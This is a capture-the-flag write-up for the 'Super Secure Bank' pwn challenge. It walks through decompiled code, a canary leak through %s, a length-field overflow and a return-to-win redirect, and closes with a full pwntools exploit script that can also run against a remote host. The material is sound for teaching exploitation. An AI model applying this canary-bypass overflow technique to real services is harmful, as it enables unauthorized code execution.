# Olicyber Territoriale 2026 – Binary 3 – Super Secure Bank

## Overview

The binary implements a simple banking interface with three options:

- Deposit
- Get rich (disabled)
- Exit

Despite the presence of stack canaries, the program is vulnerable to a stack-based buffer overflow combined with an information leak, allowing us to *Return to win*:

1. Leak the stack canary
2. Bypass stack protection
3. Overwrite the return address
4. Redirect execution to `get_rich()` to print the flag

---

## Binary Analysis

### Main Control Flow

```c
while (1) {
    v3 = menu();
    if (v3 == 1)
        deposit();
    else if (v3 == 2)
        puts("Sorry this function is not available yet");
    else if (v3 == 3)
        exit(0);
}
```

Important points:

-   Option 2 ("Get rich") is intentionally disabled
    
-   The function `get_rich()` is still present in the binary
    

----------

### Decompiled Functions

#### `main`

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3;

  set_buf();
  while (1)
  {
    while (1)
    {
      v3 = menu();
      if (v3 != 2)
        break;
      puts("Sorry this function is not available yet");
    }
    if (v3 == 3)
    {
      puts("Goodbye!");
      _exit(0);
    }
    if (v3 == 1)
      deposit();
    else
      puts("Invalid choice.");
  }
}
```

----------

#### `get_rich`

```c
unsigned __int64 get_rich()
{
  int fd;
  int saved;
  unsigned __int64 canary;
  char buf[128];

  canary = __readfsqword(0x28u);
  fd = open("flag", 0);
  if (fd < 0)
  {
    puts("Flag file missing.");
    exit(1);
  }
  saved = fd;
  memset(buf, 0, 128);
  read(fd, buf, 0x80uLL);
  puts(buf);
  close(saved);

  if (canary != __readfsqword(0x28u))
    return menu();
  return 0;
}
```

This is the target function: it reads and prints the flag file.

----------

#### `deposit`

```c
__int64 deposit()
{
  __int128 buf_2;
  int buf;
  char size[4];
  unsigned __int64 canary;

  canary = __readfsqword(0x28u);
  size[0] = 0;
  buf_2 = 0;
  buf = 0;

  printf("Insert your bank name length (max %lu): ", 15LL);
  scanf("%hhu%*c", size);

  if (size[0] > 14u)
  {
    puts("Bank Name too long!");
  }
  else
  {
    puts("Ok..... bank name length valid");
    printf("Insert your credit card pin: ");
    read_digits(0, (char *)&buf);

    printf("Ok..... credit card pin is: %s\n", (char *)&buf);

    printf("Insert your bank name: ");
    read_exactly(0, (char *)&buf_2, (unsigned __int8)size[0]);

    puts("Ok..... bank name valid");
    puts("Depositing some money...");
  }

  if (canary != __readfsqword(0x28u))
    return get_rich();
  return 0;
}
```

This function contains all the vulnerabilities used in the exploit.

----------

#### `read_digits`

```c
__int64 read_digits(int fd, char *buf)
{
  char c;

  while (1)
  {
    if (read(fd, buf, 1) != 1)
      _exit(1);

    c = *buf;
    if (c == '\n')
      break;

    if (!isdigit(c))
    {
      puts("Invalid non digit char found.. exiting");
      _exit(1);
    }

    buf++;
  }
}
```

Reads unbounded input into a fixed-size buffer.

----------

#### `read_exactly`

```c
__int64 read_exactly(int fd, char *buf, __int64 size)
{
  ssize_t r;
  __int64 i = 0;

  while (i < size)
  {
    r = read(fd, buf + i, size - i);
    if (r <= 0)
      _exit(1);
    i += r;
  }
}
```

Performs a controlled read based on attacker-influenced size.

----------

## Goal

Call `get_rich()` by exploiting a memory corruption vulnerability.

----------

## Vulnerability Analysis

### `deposit()` Stack Layout

```
[ buf_2 ]   16 bytes
[ buf   ]    4 bytes
[ size  ]    4 bytes
[ canary ]   8 bytes
[ saved rbp ] 8 bytes
[ return addr ]
```

----------

### Vulnerability 1 – Overflow via `read_digits`

```c
read_digits(0, (char *)&buf);
```

-   `buf` is 4 bytes
    
-   No bounds checking
    

Allows overwrite of:

```
buf (4) + size (4)

```

----------

### Vulnerability 2 – Canary Leak via `%s`

```c
printf("Ok..... credit card pin is: %s\n", (const char *)&buf);
```

-   `%s` reads until NULL byte
    
-   Canary starts with `\x00`
    

This leaks the remaining 7 bytes of the canary.

----------

### Vulnerability 3 – Controlled Overflow

```c
read_exactly(0, (char *)&buf_2, (unsigned __int8)size[0]);
```

-   `size[0]` is attacker-controlled
    
-   Used as read length
    

Enables full overflow.

----------

## Exploitation Strategy

### Step 1 – Leak the Canary

Input:

```
11111111
```

Extraction:

```python
m = io.recvuntil(b"Insert your bank name:")
m = m.split(b"11111111\n")[1].split(b"\n")[0]
m = b"\x00" + m
```

----------

### Step 2 – Corrupt `size[0]`

Set to `'1'` → 49 bytes read → overflow.

----------

### Step 3 – Build Payload

```python
payload = (
    b"A" * 16 +
    b"B" * 4 +
    b"C" * 4 +
    canary +
    b"D" * 8 +
    get_rich_addr
)
```

----------

### Step 4 – Redirect Execution

```python
p64(0x000000000040077d)
```

----------


## Final Exploit

```python
from pwn import *
import sys

context.gdb_binary = '/usr/local/bin/pwndbg'

exe = './supersecurebank'
elf = context.binary = ELF(exe, checksec=False)

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

gdbscript = '''
break main
continue
'''

argv = []
a = ()
kw = {}

if args.GDB:
    io = gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
elif args.REMOTE:
    host = sys.argv[1]
    port = int(sys.argv[2])
    io = remote(host, port, *a, **kw)
else:
    io = process([exe] + argv, *a, **kw)

# Trigger overflow to leak stack canary
io.sendline(b"1")
io.sendline(b"14")
io.sendline(b"11111111")

# Extract leaked canary (missing leading null byte)
m = io.recvuntil(b"Insert your bank name:")
m = m.split(b"11111111\n")[1].split(b"\n")[0]
m = b"\x00" + m
print(f"Leaked canary: {m.hex()}")

# Address of win function
get_rich_addr = p64(0x000000000040077d)

# Build payload: buffer + canary + overwrite RIP
payload = b"A" * 16 + b"B" * 4 + b"C" * 4 + m[:8] + b"D" * 8 + get_rich_addr

print(f"Payload size: {len(payload)}")

# Send exploit
io.sendline(payload)
io.interactive()
```    
